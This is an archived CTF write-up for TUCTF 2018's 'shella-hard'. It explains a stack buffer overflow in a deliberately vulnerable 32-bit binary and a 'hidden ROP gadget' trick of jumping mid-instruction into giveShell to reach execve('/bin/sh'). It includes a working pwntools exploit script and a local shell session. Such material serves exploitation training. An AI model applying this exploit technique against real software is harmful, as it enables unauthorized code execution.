# shella-hard

**CTF:** TU 2018  
**Category:** misc  
**Original writeup:** <https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/> — by **teamrocketist**. All credit goes to the original author; this is an archived copy.

---

[Pwn] TUCTF 2018 - Shella Hard



Shella Hard

475



Difficulty: mind-melting hard

This program is crap! Is there even anything here?



nc 3.16.169.157 12345





We were given a 32 bit binary:

1

2

$ file shella-hard

shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped



Checking it’s security we can see we have NX enabled:

1

2

3

4

5

6

7

$ checksec shella-hard

[*] '/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard'

Arch: i386-32-little

RELRO: Partial RELRO

Stack: No canary found

NX: NX enabled

PIE: No PIE (0x8048000)



Now looking at the main function on radare2:



We can easily see we have a buffer overflow here, the buf is located at ebp-0x10 and we are allowed to read up to 0x30 bytes with the read instruction, perhaps we have some limitations, we have a very limited space it only overflows 0x20 bytes from the buffer so we can’t create a very big rop chain, the binary is dynamic linked and the admins didn’t provide any libc file, even when not provided we can still use to find it , but we don’t have any way of leaking addresses, because the binary doesn’t use any function that spits the output to the stdout like printf, puts or even write.

So since we can’t do anything of this the admins probably provided a way of creating a shell within the code, as we can see in radare we have a function named giveShell, which uses execve:

After calculating the offsets to the return address we get something like this:

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

from pwn import *

import random

import time



def getConn():

return process('./shella-hard', aslr=False, env={}) if local else remote('3.16.169.157', 12345)



local = True

debug = True

context.terminal = ['tmux', 'new-window']

binary = ELF('./shella-hard')





GIVESHELL = 0x0804845c

r = getConn()

if debug:

gdb.attach(r, """b main

b *0x08048457

b *0x08048467

b *0x08048449

c""")

r.send('A'* 20 + p32(GIVESHELL))

r.interactive()



But as we can see it looks broken? the address 0x6a006a44 will make us to crash into a page fault, as we can see here on gdb if we try to jump immediately into that function:

After loosing some time and trying another things I remembered reading a paper about a cool ROP technique to find “hidden” rop gadgets, but what’s a hidden rop gadget? Let’s take an example:

1

2

8049166: 66 90 xchg %ax,%ax

8049168: 80 3c 1f c3 cmpb $0xc3,(%edi,%ebx,1)



For example this could be a sample snippet from objdump.

The first column is the address of the instruction.

The second column is the hexadecimal code (machine code) of the x86 instruction.

The last column is the assembly instruction itself, in ASCII human readable format, with mnemonic and operands etc.

You can notice the presence of the value 0xc3 as the last byte of the second instruction.

This value is really important because it happens to be the machine code for the “ret” instruction.

So the trick here is to jump into the middle of this instruction:

1

cmpb $0xc3,(%edi,%ebx,1)



For instance at address 0x8049166a. The CPU would see the following machine code sequence:

1f c3

Which will be interpreted as:

1

2

3

00000000 <.data>:

0: 1f pop %ds

1: c3 ret



Finding a hidden rop gadget, we can use the same idea in the function givenShell:

1

2

3

4

5

6

7

8

9

10

11

12

13

14

/ (fcn) sym.giveShell 26

| sym.giveShell ();

| 0x08048458 55 push ebp

| 0x08048459 89e5 mov ebp, esp

| 0x0804845b 90 nop

| 0x0804845c a1446a006a mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1

| 0x08048461 006800 add byte [eax], ch

| 0x08048464 850408 test dword [eax + ecx], eax ; [0x13:4]=-1 ; 19

| 0x08048467 e8b4feffff call sym.imp.execve

| 0x0804846c 83c40c add esp, 0xc

| 0x0804846f 90 nop

| 0x08048470 c9 leave

\ 0x08048471 c3 ret

[0x08048340]>



What I did was to jump into the middle of:

1

| 0x0804845c a1446a006a mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1



So lets see what happens what’s the “transformation” in radare if we jump into the middle:

This is perfect! we get exactly what we need for spawning a shell! it even reveals there was a global with a “/bin/sh” string that I didn’t even found.

Now fixing our python script:

1

2

3

4

5

6

7

8

9

10

11

12

13

14

$ python shella-hard.py

[*] '/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard'

Arch: i386 -32 -little

RELRO: Partial RELRO

Stack: No canary found

NX: NX enabled

PIE: No PIE ( 0x8048000 )

[+] Starting local process './shella-hard' : pid 1190

[!] ASLR is disabled!

[*] Switching to interactive mode

$ ls

core flag output32 shella-hard shella-hard.py wtf.c

$ cat flag

flag{test-flag-here}



No real flag here, unfortunately the admins shut down the challenges right after the challenges so I can only show it working locally and I don’t remember the real flag, anyway it doesn’t really matter.
